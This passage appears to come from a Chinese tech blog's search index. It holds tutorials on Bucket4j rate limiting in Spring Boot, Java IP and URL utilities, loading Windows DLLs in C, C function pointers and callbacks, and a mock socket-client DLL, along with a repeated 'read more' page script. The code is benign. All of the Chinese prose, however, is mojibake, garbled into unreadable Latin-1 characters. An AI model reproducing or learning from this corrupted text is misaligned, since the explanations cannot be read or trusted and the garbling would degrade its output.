&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt; åˆ›å»ºç¼“å­˜é…ç½®ç±»ï¼Œå¹¶æ·»åŠ  @EnableCaching æ³¨è§£æ¥å¯ç”¨ç¼“å­˜åŠŸèƒ½ 12345@EnableCaching@Configurationpublic class Bucket4jCacheConfig {} åˆ›å»º Controller ç±» 123456789101112131415161718import org.springframework.http.ResponseEntity;import org.springframework.web.bind.annotation.GetMapping;import org.springframework.web.bind.annotation.RestController;@RestControllerpublic class TestController { @GetMapping("hello") public ResponseEntity&lt;String&gt; hello() { return ResponseEntity.ok("Hello World"); } @GetMapping("world") public ResponseEntity&lt;String&gt; world() { return ResponseEntity.ok("Hello World"); }} åˆ›å»ºä¸»å¯åŠ¨ç±» 12345678@SpringBootApplicationpublic class Bucket4jApplication { public static void main(String[] args) { SpringApplication.run(Bucket4jApplication.class, args); }} åˆ›å»º application.yml ä¸»é…ç½®æ–‡ä»¶ 12345678910111213141516171819202122server: port: 8080spring: application: name: bucket4j-spring-boot-caffeine cache: cache-names: - buckets caffeine: spec: maximumSize=1000000,expireAfterAccess=3600s # è®¾ç½®äº†åä¸ºbucketsçš„ç¼“å­˜ï¼Œè¿‡æœŸæ—¶é—´ä¸º1hï¼Œå®¹é‡ä¸º1000000bucket4j: enabled: true filters: - cache-name: buckets url: .* rate-limits: - bandwidths: - capacity: 2 time: 10 unit: seconds # è®¾ç½®çš„rate-limitsæ¯10ç§’2ä¸ªtoken Bucket4j é…ç½®å‚æ•°è¯´æ˜å¦‚ä¸‹ï¼š bucket4j.enabled=trueï¼šå¯ç”¨ Bucket4j çš„è‡ªåŠ¨é…ç½® bucket4j.filters.cache-nameï¼šä»ç¼“å­˜ä¸­è·å– API å¯†é’¥çš„ Bucket bucket4j.filters.urlï¼šè¡¨ç¤ºåº”ç”¨é€Ÿç‡é™åˆ¶çš„è·¯å¾„è¡¨è¾¾å¼ï¼Œ.* è¡¨ç¤ºæ‹¦æˆªæ‰€æœ‰ URL bucket4j.filters.rate-limits.bandwidthsï¼šå®šä¹‰ Bucket4j é€Ÿç‡é™åˆ¶å‚æ•° ä»£ç æµ‹è¯•æ­£å¸¸è¯·æ±‚æ¥å£çš„æ—¶å€™ï¼ŒæœåŠ¡ç«¯å“åº”çš„ç»“æœå¦‚ä¸‹ï¼š 12345$ curl -v -X GET \'http://127.0.0.1:8080/hello\'&lt; HTTP/1.1 200&lt; X-Rate-Limit-Remaining: 1Hello World å½“é¢‘ç¹è¯·æ±‚æ¥å£çš„æ—¶å€™ï¼ŒæœåŠ¡ç«¯ä¼šè¿”å› 429 çš„ HTTP çŠ¶æ€ç å’Œ JSON æ•°æ® { "message": "Too many requests!" }ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š 12345$ curl -v -X GET \'http://127.0.0.1:8080/hello\'&lt; HTTP/1.1 429&lt; X-Rate-Limit-Retry-After-Seconds: 2{ "message": "Too many requests!" } è‡ªå®šä¹‰é™æµå“åº”ç»“æœå½“è§¦å‘é™æµæ¡ä»¶æ—¶ï¼ŒBucket4j é»˜è®¤ä¼šè¿”å› 429 çš„ HTTP çŠ¶æ€ç ï¼ŒåŒæ—¶è¿”å› JSON æ•°æ® { "message": "Too many requests!" } ç»™å®¢æˆ·ç«¯ã€‚è‹¥éœ€è¦è‡ªå®šä¹‰è¿”å›çš„æ•°æ®å†…å®¹ï¼Œå¯ä»¥é…ç½® http-response-body å‚æ•°ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š 1234567891011bucket4j: enabled: true filters: - cache-name: buckets url: .* http-response-body: \'{"code":429,"data":"","msg":"Too many requests!"}\' rate-limits: - bandwidths: - capacity: 2 time: 10 unit: seconds å‚è€ƒåšå®¢ Rate Limiting a Spring API Using Bucket4j var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"java å¾®æœåŠ¡"},{title:"Java å¼€å‘å¸¸ç”¨ä»£ç å—ä¹‹ä¸€",url:"/posts/677dbf04.html",text:'ç½‘ç»œç¼–ç¨‹è·å– IP åœ°å€12345678910111213141516171819202122232425262728293031323334353637383940import cn.hutool.core.util.StrUtil;import javax.servlet.http.HttpServletRequest;/** * IPåœ°å€å·¥å…· */public class IPUtils { /** * è·å–IPåœ°å€ * å¦‚æœä½¿ç”¨Nginxç­‰åå‘ä»£ç†è½¯ä»¶ï¼Œä¸èƒ½é€šè¿‡request.getRemoteAddr()è·å–IPåœ°å€ * å¦‚æœä½¿ç”¨äº†å¤šçº§åå‘ä»£ç†çš„è¯ï¼ŒX-Forwarded-Forçš„å€¼å¹¶ä¸æ­¢ä¸€ä¸ªï¼Œè€Œæ˜¯ä¸€ä¸²IPåœ°å€ï¼ŒX-Forwarded-Forä¸­ç¬¬ä¸€ä¸ªéunknownçš„æœ‰æ•ˆIPå­—ç¬¦ä¸²ï¼Œåˆ™ä¸ºçœŸå®IPåœ°å€ */ public static String getIpAddr(HttpServletRequest request) { String ip = null; try { ip = request.getHeader("x-forwarded-for"); if (StrUtil.isEmpty(ip) || "unknown".equalsIgnoreCase(ip)) { ip = request.getHeader("Proxy-Client-IP"); } if (StrUtil.isEmpty(ip) || ip.length() == 0 || "unknown".equalsIgnoreCase(ip)) { ip = request.getHeader("WL-Proxy-Client-IP"); } if (StrUtil.isEmpty(ip) || "unknown".equalsIgnoreCase(ip)) { ip = request.getHeader("HTTP_CLIENT_IP"); } if (StrUtil.isEmpty(ip) || "unknown".equalsIgnoreCase(ip)) { ip = request.getHeader("HTTP_X_FORWARDED_FOR"); } if (StrUtil.isEmpty(ip) || "unknown".equalsIgnoreCase(ip)) { ip = request.getRemoteAddr(); } } catch (Exception e) { System.out.println("IPUtils ERROR " + e.getLocalizedMessage()); } return ip; }} æ­£åˆ™è¡¨è¾¾å¼è§£æ URLé€šè¿‡æ­£åˆ™è¡¨è¾¾å¼ï¼Œè·å– URL ä¸­çš„åè®®ã€åŸŸåã€ç«¯å£ã€URIã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657import cn.hutool.core.util.StrUtil;import java.util.HashMap;import java.util.Map;import java.util.regex.Matcher;import java.util.regex.Pattern;public class HttpUtil { public static final String HTTP_PROTOCOL = "http://"; public static final String HTTPS_PROTOCOL = "https://"; /** * è§£æURLï¼ˆåŒ…æ‹¬åè®®ã€åŸŸåã€ç«¯å£ã€URIï¼‰ * * @param url * @return */ public static Map&lt;String, String&gt; parseUrl(String url) { Map&lt;String, String&gt; map = new HashMap(4); try { Pattern pattern = Pattern.compile("(https?://)([^:^/]*)(:\\\\d*)?(.*)?"); Matcher matcher = pattern.matcher(url); boolean findResult = matcher.find(); if (!findResult) { return map; } String protocol = matcher.group(1); String domain = matcher.group(2); String port = matcher.group(3); String uri = matcher.group(4); if (StrUtil.isBlank(port)) { if (HTTP_PROTOCOL.equals(protocol)) { port = "80"; } else if (HTTPS_PROTOCOL.equals(protocol)) { port = "443"; } else { port = "unknown"; } } else { port = port.replace(":", ""); } map.put("protocol", protocol); map.put("domain", domain); map.put("port", port); map.put("uri", uri); } catch (Exception e) { e.printStackTrace(); } return map; }} var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"java ä»£ç å—"},{title:"C è¯­è¨€å¼€å‘å¸¸ç”¨ä»£ç å—ä¹‹ä¸€",url:"/posts/3b2974c1.html",text:'åŠ è½½åŠ¨æ€åº“åŠ è½½åŠ¨æ€é“¾æ¥åº“ï¼ˆ.dllï¼‰ä¸‹è¿°ç¤ºä¾‹ä»£ç ï¼Œé€‚ç”¨äº Windows ç³»ç»Ÿçš„ C è¯­è¨€å¼€å‘ã€‚ 12345678910111213141516171819202122232425262728293031323334#include &lt;stdio.h&gt;#include &lt;windows.h&gt;int main() { HINSTANCE hInstance; // åŠ è½½åŠ¨æ€é“¾æ¥åº“ hInstance = LoadLibrary("./socketclient.dll"); if (hInstance == NULL) { printf("LoadLibrary() è°ƒç”¨å¤±è´¥, ErrorCode: %d", GetLastError()); return -1; } // å®šä¹‰å‡½æ•°ç±»å‹æŒ‡é’ˆ typedef int (*CltSocketInit)(void** handle); // è°ƒç”¨åŠ¨æ€é“¾æ¥åº“ CltSocketInit cltSocketInit = (CltSocketInit)GetProcAddress(hInstance, "cltSocketInit"); if (cltSocketInit != NULL) { void* handle = NULL; int result = cltSocketInit(&amp;handle); printf("result = %d", result); } // é‡Šæ”¾åŠ¨æ€é“¾æ¥åº“ if (hInstance != NULL) { FreeLibrary(hInstance); } return 0;} var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"cè¯­è¨€ ä»£ç å—"},{title:"C è¯­è¨€é¢å‘æ¥å£ç¼–ç¨‹å’Œå¤šæ€",url:"/posts/1844a1fe.html",text:'æ•°ç»„æŒ‡é’ˆæ•°ç»„ç±»å‹çš„è¯­æ³•C è¯­è¨€ä¸­çš„æ•°ç»„æœ‰è‡ªå·±ç‰¹å®šçš„ç±»å‹ï¼Œå¯ä»¥é€šè¿‡ typedef å…³é”®å­—å®šä¹‰æ•°ç»„ç±»å‹ï¼Œè¯­æ³•æ ¼å¼ä¸ºï¼štypedef type(name)[length];ï¼Œä¾‹å¦‚ï¼š typedef int(MyIntArray)[3]; typedef char(MyCharArray)[3]; æ•°ç»„æŒ‡é’ˆç±»å‹çš„è¯­æ³• æ•°ç»„æŒ‡é’ˆç±»å‹ç”¨äºæŒ‡å‘ä¸€ä¸ªæ•°ç»„ å¯ä»¥ç›´æ¥å®šä¹‰æ•°ç»„æŒ‡é’ˆç±»å‹ï¼štypedef type(*name)[length]; æ•°ç»„ç±»å‹ä¸æ•°ç»„æŒ‡é’ˆç±»å‹çš„ä½¿ç”¨12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#include &lt;stdio.h&gt;int main() { // 1. å®šä¹‰æ•°ç»„ç±»å‹ï¼ˆä¼šåˆ†é…å†…å­˜ç©ºé—´ï¼‰ typedef int(MyArray)[3]; MyArray array; array[0] = 1; array[1] = 2; array[2] = 3; for (int i = 0; i &lt; 3; i++) { printf("array[%d] = %d\\n", i, array[i]); } printf("\\n"); // 2. å®šä¹‰æ•°ç»„æŒ‡é’ˆç±»å‹ï¼ˆä¸ä¼šåˆ†é…å†…å­˜ç©ºé—´ï¼‰ typedef int(*MyPointArray)[3]; int a[3]; MyPointArray pointArray; pointArray = &amp;a; // å°†æ•°ç»„æŒ‡é’ˆç±»å‹æŒ‡å‘ä¸€ä¸ªæ•°ç»„ (*pointArray)[0] = 11; (*pointArray)[1] = 22; (*pointArray)[2] = 33; for (int j = 0; j &lt; 3; j++) { printf("a[%d] = %d, ", j, a[j]); printf("(*pointArray)[%d] = %d\\n", j, (*pointArray)[j]); } printf("\\n"); // 3. å®šä¹‰ä¸€ä¸ªæ•°ç»„æŒ‡é’ˆå˜é‡ï¼ˆä¸ä¼šåˆ†é…å†…å­˜ç©ºé—´ï¼‰ int(*pointArrayVar)[3]; int b[3]; pointArrayVar = &amp;b; // å°†æ•°ç»„æŒ‡é’ˆå˜é‡æŒ‡å‘ä¸€ä¸ªæ•°ç»„ (*pointArrayVar)[0] = 111; (*pointArrayVar)[1] = 222; (*pointArrayVar)[2] = 333; for (int n = 0; n &lt; 3; n++) { printf("b[%d] = %d, ", n, b[n]); printf("(*pointArrayVar)[%d] = %d\\n", n, (*pointArrayVar)[n]); }} ç¨‹åºè¿è¡Œçš„è¾“å‡ºç»“æœå¦‚ä¸‹ï¼š 1234567891011array[0] = 1array[1] = 2array[2] = 3a[0] = 11, (*pointArray)[0] = 11a[1] = 22, (*pointArray)[1] = 22a[2] = 33, (*pointArray)[2] = 33b[0] = 111, (*pointArrayVar)[0] = 111b[1] = 222, (*pointArrayVar)[1] = 222b[2] = 333, (*pointArrayVar)[2] = 333 å‡½æ•°æŒ‡é’ˆå‡½æ•°ç±»å‹çš„è¯­æ³•C è¯­è¨€ä¸­çš„å‡½æ•°æœ‰è‡ªå·±ç‰¹å®šçš„ç±»å‹ï¼Œå¯ä»¥é€šè¿‡ typedef å…³é”®å­—å®šä¹‰å‡½æ•°ç±»å‹ï¼Œè¯­æ³•æ ¼å¼ä¸ºï¼štypedef type (name)(parameter list);ï¼Œä¾‹å¦‚ï¼š typedef int (f)(int, int); typedef void (p)(int); å‡½æ•°æŒ‡é’ˆç±»å‹çš„è¯­æ³• å‡½æ•°æŒ‡é’ˆç±»å‹ç”¨äºæŒ‡å‘ä¸€ä¸ªå‡½æ•° å‡½æ•°æœ‰ä¸‰å¤§è¦ç´ ï¼šåç§°ã€å‚æ•°ã€è¿”å›å€¼ï¼Œå‡½æ•°åæ˜¯å‡½æ•°ä½“çš„å…¥å£åœ°å€ å¯ä»¥é€šè¿‡å‡½æ•°ç±»å‹å®šä¹‰å‡½æ•°æŒ‡é’ˆç±»å‹: FuncType* pointer; ä¹Ÿå¯ä»¥ç›´æ¥å®šä¹‰å‡½æ•°æŒ‡é’ˆç±»å‹ï¼štypedef type (*pointer)(parameter list); pointerï¼šå‡½æ•°æŒ‡é’ˆå˜é‡å typeï¼šæŒ‡å‘å‡½æ•°çš„è¿”å›å€¼ç±»å‹ parameter listï¼šæŒ‡å‘å‡½æ•°çš„å‚æ•°ç±»å‹åˆ—è¡¨ å‡½æ•°ç±»å‹ä¸å‡½æ•°æŒ‡é’ˆç±»å‹çš„ä½¿ç”¨12345678910111213141516171819202122232425262728293031323334#include &lt;stdio.h&gt;int add(int a, int b) { return a + b;}int main() { // 1. å®šä¹‰å‡½æ•°ç±»å‹ typedef int (MyFuncType)(int a, int b); // é€šè¿‡å‡½æ•°ç±»å‹å®šä¹‰å‡½æ•°æŒ‡é’ˆç±»å‹ MyFuncType* myFuncType = add; int result = myFuncType(1, 3); printf("%d + %d = %d\\n", 1, 3, result); // 2. å®šä¹‰ä¸€ä¸ªå‡½æ•°æŒ‡é’ˆç±»å‹ï¼ˆä¸ä¼šåˆ†é…å†…å­˜ç©ºé—´ï¼‰ typedef int (*MyFuncPointType)(int a, int b); // åŠ ä¸åŠ ä¸Š"&amp;"ç¬¦å·éƒ½æ˜¯å¯ä»¥çš„ï¼Œå¦‚æœåŠ ä¸Šäº†"&amp;"ç¬¦å·ï¼Œå¯ä»¥è§£å†³Cè¯­è¨€ç‰ˆæœ¬çš„å…¼å®¹é—®é¢˜ // MyFuncPointType myFuncPointType = &amp;add; MyFuncPointType myFuncPointType = add; int result2 = myFuncPointType(4, 5); printf("%d + %d = %d\\n", 4, 5, result2); // 3. å®šä¹‰å‡½æ•°æŒ‡é’ˆå˜é‡ï¼ˆä¼šåˆ†é…å†…å­˜ç©ºé—´ï¼‰ int (*MyFuncPointVar)(int a, int b); MyFuncPointVar = add; int result3 = MyFuncPointVar(7, 9); printf("%d + %d = %d\\n", 7, 9, result3); return 0;} ç¨‹åºè¿è¡Œçš„è¾“å‡ºç»“æœå¦‚ä¸‹ï¼š 1231 + 3 = 44 + 5 = 97 + 9 = 16 å‡½æ•°ç±»å‹ä¸å‡½æ•°æŒ‡é’ˆä½œä¸ºå‡½æ•°å‚æ•°å‡½æ•°ç±»å‹ä½œä¸ºå‡½æ•°å‚æ•°å½“å‡½æ•°ç±»å‹åšä¸ºå‡½æ•°çš„å‚æ•°ä¼ é€’ç»™ä¸€ä¸ªè¢«è°ƒç”¨å‡½æ•°ï¼Œè¢«è°ƒç”¨å‡½æ•°å°±å¯ä»¥é€šè¿‡è¿™ä¸ªå‡½æ•°ç±»å‹è°ƒç”¨å¤–éƒ¨çš„å‡½æ•°ï¼Œè¿™å°±å½¢æˆäº†å›è°ƒå‡½æ•°ã€‚C è¯­è¨€å›è°ƒå‡½æ•°çš„æœ¬è´¨æ˜¯ï¼Œæå‰åšäº†ä¸€ä¸ªåè®®çš„çº¦å®šï¼ˆæŠŠå‡½æ•°çš„å‚æ•°ã€å‡½æ•°çš„è¿”å›å€¼ç±»å‹æå‰çº¦å®šï¼‰ã€‚ 1234567891011121314151617181920212223242526272829303132#include &lt;stdio.h&gt;// å®šä¹‰å‡½æ•°ç±»å‹typedef int (MyFuncType)(int a, int b);int add(int a, int b) { return a + b;}int mult(int a, int b) { return a * b;}// å‡½æ•°ç±»å‹ä½œä¸ºå‡½æ•°å‚æ•°int callbackFunc(MyFuncType func) { return func(3, 6);}int main() { // é€šè¿‡å‡½æ•°ç±»å‹å®šä¹‰å‡½æ•°æŒ‡é’ˆç±»å‹ MyFuncType* myFuncType = NULL; myFuncType = add; int result = callbackFunc(*myFuncType); printf("result = %d\\n", result); myFuncType = mult; int result2 = callbackFunc(*myFuncType); printf("result = %d\\n", result2); return 0;} ç¨‹åºè¿è¡Œçš„è¾“å‡ºç»“æœå¦‚ä¸‹ï¼š 12result = 9result = 18 å‡½æ•°æŒ‡é’ˆä½œä¸ºå‡½æ•°å‚æ•°å½“å‡½æ•°æŒ‡é’ˆåšä¸ºå‡½æ•°çš„å‚æ•°ä¼ é€’ç»™ä¸€ä¸ªè¢«è°ƒç”¨å‡½æ•°ï¼Œè¢«è°ƒç”¨å‡½æ•°å°±å¯ä»¥é€šè¿‡è¿™ä¸ªæŒ‡é’ˆè°ƒç”¨å¤–éƒ¨çš„å‡½æ•°ï¼Œè¿™å°±å½¢æˆäº†å›è°ƒå‡½æ•°ã€‚C è¯­è¨€å›è°ƒå‡½æ•°çš„æœ¬è´¨æ˜¯ï¼Œæå‰åšäº†ä¸€ä¸ªåè®®çš„çº¦å®šï¼ˆæŠŠå‡½æ•°çš„å‚æ•°ã€å‡½æ•°çš„è¿”å›å€¼ç±»å‹æå‰çº¦å®šï¼‰ã€‚ a) å°† â€œå‡½æ•°çš„è°ƒç”¨â€ å’Œ â€œå‡½æ•°çš„å®ç°â€ è§£è€¦ b) å¯ä»¥æ¨¡æ‹Ÿ C++ çš„å¤šæ€æœºåˆ¶ï¼ˆæå‰å¸ƒå±€ VPTR æŒ‡é’ˆå’Œè™šå‡½æ•°è¡¨ï¼Œæ‰¾è™šå‡½æ•°å…¥å£åœ°å€æ¥å®ç°å‡½æ•°è°ƒç”¨ï¼‰ 1234567891011121314151617181920212223242526272829#include &lt;stdio.h&gt;int add(int a, int b) { return a + b;}int mult(int a, int b) { return a * b;}// å‡½æ•°æŒ‡é’ˆåšå‡½æ•°å‚æ•°int callbackFunc(int (*MyFunc)(int a, int b)) { return MyFunc(3, 4);}int main() { // å®šä¹‰å‡½æ•°æŒ‡é’ˆå˜é‡ int (*myFuncVar)(int a, int b); myFuncVar = add; int result = callbackFunc(myFuncVar); printf("result = %d\\n", result); myFuncVar = mult; int result2 = callbackFunc(myFuncVar); printf("result = %d\\n", result2); return 0;} ç¨‹åºè¿è¡Œçš„è¾“å‡ºç»“æœå¦‚ä¸‹ï¼š 12result = 7result = 12 ä¸Šè¿°çš„ addã€mult å‡½æ•°éƒ½æ˜¯å†™åœ¨åŒä¸€ä¸ªæºæ–‡ä»¶å½“ä¸­ï¼Œå‡å¦‚ add å‡½æ•°æ˜¯ä¸€ä¸ªåº“ä¸­çš„å‡½æ•°ï¼Œæ­¤æ—¶å°±åªæœ‰ä½¿ç”¨å›è°ƒäº†ï¼Œé€šè¿‡å‡½æ•°æŒ‡é’ˆå‚æ•°å°†å¤–éƒ¨å‡½æ•°åœ°å€ä¼ å…¥æ¥å®ç°è°ƒç”¨ã€‚æ—¥åå¦‚æœåº“é‡Œé¢çš„ add å‡½æ•°çš„ä»£ç ä½œäº†ä¿®æ”¹ï¼Œä¹Ÿä¸å¿…æ”¹åŠ¨å‡½æ•°è°ƒç”¨æ–¹çš„ä»£ç ï¼Œå°±å¯ä»¥æ­£å¸¸å®ç°è°ƒç”¨ï¼Œä¾¿äºç¨‹åºçš„ç»´æŠ¤å’Œå‡çº§ã€‚ DLL åŠ¨æ€é“¾æ¥åº“çš„ä½¿ç”¨ä¸‹é¢å°†ä»‹ç» C/C++ å¦‚ä½•å¼€å‘å’Œè°ƒç”¨ä¸€æ¬¾ Socket å®¢æˆ·ç«¯çš„ DLL åŠ¨æ€é“¾æ¥åº“ï¼Œè¯¥ DLL ä¸»è¦å®ç°äº† Socket å®¢æˆ·ç«¯çš„åˆå§‹åŒ–ã€æŠ¥æ–‡å‘é€ã€æŠ¥æ–‡æ¥æ”¶ã€èµ„æºé‡Šæ”¾ç­‰åŠŸèƒ½ï¼Œç¬¬ä¸‰æ–¹å¯ä»¥ç›´æ¥è°ƒç”¨è¯¥ DLL å®ç° Socket é€šä¿¡ã€‚å€¼å¾—ä¸€æçš„æ˜¯ï¼Œæœ¬æ¡ˆä¾‹å¹¶æ²¡æœ‰çœŸæ­£å®Œæ•´åœ°å®ç° Socket å®¢æˆ·ç«¯çš„åº•å±‚ä»£ç ï¼Œæ›´å¤šçš„æ˜¯ä½¿ç”¨ä¼ªä»£ç æ¥æ¨¡æ‹Ÿ Socket å®¢æˆ·ç«¯çš„é€šä¿¡ã€‚ è¿è¡Œç¯å¢ƒè¯´æ˜è¿™é‡Œç»™å‡ºçš„æ¡ˆä¾‹ä»£ç å’Œæ“ä½œæ­¥éª¤ï¼Œåªé€‚ç”¨äº Windows ç³»ç»Ÿçš„ C/C++ å¼€å‘ï¼Œä¸”ä¾èµ– Visual Studio å¼€å‘å·¥å…·ï¼Œä¸é€‚ç”¨äº Linux ç³»ç»Ÿçš„ C/C++ å¼€å‘ã€‚ DLL é¡¹ç›®çš„åˆ›å»ºæ–°å»º DLL é¡¹ç›® å€¼å¾—ä¸€æçš„æ˜¯ï¼Œé€šè¿‡ Visual Studio åˆ›å»º DLLï¼ˆåŠ¨æ€é“¾æ¥åº“ï¼‰é¡¹ç›®ï¼Œæºæ–‡ä»¶é»˜è®¤çš„åç¼€æ˜¯ .cppï¼Œå¦‚æœé¡¹ç›®ä½¿ç”¨çš„æ˜¯ C è¯­è¨€ï¼Œåˆ™éœ€è¦å°†è‡ªåŠ¨ç”Ÿæˆçš„ dllmain.cppã€pch.cpp çš„æ–‡ä»¶åæ”¹ä¸º dllmain.cã€pch.cã€‚ ç¼–å†™ DLL ä»£ç  åˆ›å»º socketclient.c æºæ–‡ä»¶ socketclient.c æºæ–‡ä»¶çš„ä»£ç å¦‚ä¸‹ï¼Œå…¶ä¸­ __declspec(dllexport) çš„ä½œç”¨æ˜¯å°†å‡½æ•°å¯¼å‡ºç»™ DLL çš„è°ƒç”¨æ–¹ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185#include "pch.h"#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;stdio.h&gt;// å®šä¹‰å‡½æ•°æŒ‡é’ˆç±»å‹ï¼Œç”¨äºæ•°æ®åŠ å¯†typedef int (*EncodeData)(unsigned char* in, int inlen, unsigned char* out, int* outlen);// å®šä¹‰ç»“æ„ä½“typedef struct _Sck_Handle { char version[16]; char ip[16]; int port; unsigned char* p; int len; char* p2; EncodeData encodeCallback;} Sck_Handle;//å®¢æˆ·ç«¯åˆå§‹åŒ–__declspec(dllexport)int socketclient_init(void** handle) { int ret = 0; Sck_Handle* tmpHandle = NULL; if (handle == NULL) { ret = -1; printf("function socketclient_init() err :%d check params == NULL err \\n", ret); return ret; } tmpHandle = (Sck_Handle*)malloc(sizeof(Sck_Handle)); if (tmpHandle == NULL) { ret = -2; printf("function socketclient_init() err :%d malloc err \\n", ret); return ret; } memset(tmpHandle, 0, sizeof(Sck_Handle)); strcpy(tmpHandle-&gt;version, "1.0.0.1"); strcpy(tmpHandle-&gt;ip, "192.168.12.12"); tmpHandle-&gt;port = 8081; //é—´æ¥èµ‹å€¼ *handle = tmpHandle; return ret;}//å®¢æˆ·ç«¯æŠ¥æ–‡å‘é€__declspec(dllexport)int socketclient_send(void* handle, unsigned char* buf, int buflen) { int ret = 0; Sck_Handle* tmpHandle = NULL; if (handle == NULL || buf == NULL || buflen &lt;= 0) { ret = -2; printf("function socketclient_send() err :%d (handle == NULL || buf == NULL || buflen &lt;= 0 ) \\n", ret); return ret; } tmpHandle = (Sck_Handle*)handle; if (tmpHandle-&gt;encodeCallback == NULL) { //æ˜æ–‡å‘é€ tmpHandle-&gt;len = buflen; tmpHandle-&gt;p = (unsigned char*)malloc(buflen); if (tmpHandle-&gt;p == NULL) { ret = -2; printf("function socketclient_send() err :%d malloc len:%d \\n", ret, buflen); return ret; } memcpy(tmpHandle-&gt;p, buf, buflen); } else { //åŠ å¯†å‘é€ unsigned char crypdata[4096]; int cryptdatalen = 4096; ret = tmpHandle-&gt;encodeCallback(buf, buflen, crypdata, &amp;cryptdatalen); if (ret != 0) { printf("function encodeCallback() err :%d \\n", ret); return ret; } tmpHandle-&gt;len = cryptdatalen; tmpHandle-&gt;p = (unsigned char*)malloc(cryptdatalen); if (tmpHandle-&gt;p == NULL) { ret = -1; printf("function socketclient_send() err :%d malloc len:%d \\n", ret, cryptdatalen); return ret; } memcpy(tmpHandle-&gt;p, crypdata, cryptdatalen); } return ret;}//å®¢æˆ·ç«¯æŠ¥æ–‡åŠ å¯†å‘é€__declspec(dllexport)int socketclient_send_encode(void* handle, unsigned char* buf, int buflen, EncodeData encodeCallback) { int ret = 0; unsigned char cryptbuf[4096]; int cryptbuflen = 4096; Sck_Handle* tmpHandle = NULL; if (handle == NULL || buf == NULL || encodeCallback == NULL) { ret = -1; printf("function socketclient_send_encode() err :%d (handle == NULL || buf == NULL || encodeCallback == NULL) \\n", ret); return ret; } // é€šè¿‡å‡½æ•°æŒ‡é’ˆï¼Œæ‰§è¡Œæ•°æ®çš„åŠ å¯†æ“ä½œ ret = encodeCallback(buf, buflen, cryptbuf, &amp;cryptbuflen); if (ret != 0) { ret = -2; printf("function socketclient_send_encode() err :%d check encode_result == 0 err \\n", ret); return ret; } tmpHandle = (Sck_Handle*)handle; tmpHandle-&gt;len = cryptbuflen; tmpHandle-&gt;p = (unsigned char*)malloc(cryptbuflen); if (tmpHandle-&gt;p == NULL) { ret = -3; printf("function socketclient_send_encode() err :%d malloc len:%d \\n", ret, cryptbuflen); return ret; } //æŠŠåŠ å¯†çš„æ˜æ–‡ç¼“å­˜åˆ°å†…å­˜ä¸­ memcpy(tmpHandle-&gt;p, cryptbuf, cryptbuflen); return 0;}//å®¢æˆ·ç«¯æŠ¥æ–‡æ¥æ”¶__declspec(dllexport)int socketclient_recv(void* handle, unsigned char* buf, int* buflen) { int ret = 0; Sck_Handle* tmpHandle = NULL; if (handle == NULL || buf == NULL || buflen == NULL) { ret = -2; printf("function socketclient_recv() err :%d (handle == NULL || buf == NULL || buflen == NULL ) \\n", ret); return ret; } tmpHandle = (Sck_Handle*)handle; memcpy(buf, tmpHandle-&gt;p, tmpHandle-&gt;len); *buflen = tmpHandle-&gt;len; return ret;}//å®¢æˆ·ç«¯èµ„æºé‡Šæ”¾__declspec(dllexport)int socketclient_destory(void* handle) { int ret = 0; Sck_Handle* tmpHandle = NULL; if (handle == NULL) { return -1; } tmpHandle = (Sck_Handle*)handle; if (tmpHandle-&gt;p != NULL) { free(tmpHandle-&gt;p); //é‡Šæ”¾ç»“æ„ä½“æˆå‘˜åŸŸçš„æŒ‡é’ˆæ‰€æŒ‡å‘çš„å†…å­˜ç©ºé—´ } free(tmpHandle); //é‡Šæ”¾ç»“æ„ä½“å†…å­˜ handle = NULL; return 0;}//è®¾ç½®åŠ å¯†å›è°ƒå‡½æ•°__declspec(dllexport)int socketclient_set_encode_callback(void* handle, EncodeData encodeCallback) { int ret = 0; Sck_Handle* tmpHandle = NULL; if (handle == NULL || encodeCallback == NULL) { ret = -1; printf("function socketclient_set_encode_callback() err :%d check (handle == NULL || 